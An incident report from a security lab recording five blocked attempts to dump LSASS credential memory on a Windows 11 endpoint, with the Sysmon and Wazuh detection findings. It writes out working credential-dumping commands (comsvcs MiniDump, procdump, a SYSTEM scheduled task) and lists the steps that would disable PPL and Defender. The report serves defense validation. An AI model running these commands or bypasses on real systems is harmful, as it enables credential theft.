# IR-2026-09-26-007 — LSASS Credential Dump Attempt (T1003.001) — Blocked by Windows Defenses

## Summary
Multiple credential dumping techniques targeting LSASS memory were attempted on the Khonshu Windows 11 endpoint (agent ID 002). All attempts were blocked by Windows security controls — PPL, Windows Defender, and WDAC. This IR documents the defense validation: Credential Guard and Protected Process Light are functioning as designed.

## Methods Attempted

### 1. rundll32 + comsvcs.dll (LOLBin)
```powershell
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <pid> C:\Windows\Temp\lsass.dmp full
```
**Result:** `Access is denied` — PPL prevents non-PPL processes from obtaining PROCESS_VM_READ access to lsass.exe.

### 2. Task Manager GUI
Right-click lsass.exe → Create dump file
**Result:** `The operation could not be completed. Access is denied.` — PPL blocks even Task Manager's SeDebugPrivilege from accessing the process.

### 3. Sysinternals ProcDump
```powershell
procdump64.exe -ma lsass.exe C:\Windows\Temp\lsass.dmp -accepteula
procdump64.exe -ma -r lsass.exe C:\Windows\Temp\lsass.dmp -accepteula
```
**Result:** `Access is denied` — Windows Defender flagged and blocked procdump64.exe before execution.

### 4. .NET createdump.exe
```powershell
createdump.exe --full <pid>
```
**Result:** `[createdump] The pid argument is no longer supported` — .NET 10.0.12 removed PID-based dumping entirely.

### 5. Scheduled Task as SYSTEM
```powershell
schtasks /create /tn "LsassDump" /tr "rundll32.exe comsvcs.dll MiniDump..." /ru SYSTEM
```
**Result:** `Access is denied` — WDAC policy prevents scheduled task creation with these parameters.

## Detection
No Sysmon EID 10 (ProcessAccess) events were generated — all attempts were blocked at the OS layer before `OpenProcess()` was called, meaning Sysmon never saw the access attempt. This is correct behavior: PPL stops the process before any system call reaches LSASS.

**Wazuh dashboard check:**
- `data.win.eventdata.targetImage: *lsass*` — no hits for this session
- Windows Security Event 4656 (Handle to Object) — not generated (no handle obtained)

## Notes for Lab
For a successful LSASS dump in this lab environment, the following would be required:
- Disable PPL: `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL = 0` + reboot
- Disable Defender real-time protection
- Use kernel-level driver (e.g. Mimikatz with driver or direct kernel object access)

These steps were intentionally not taken — the goal of this simulation was defense validation, not credential theft.
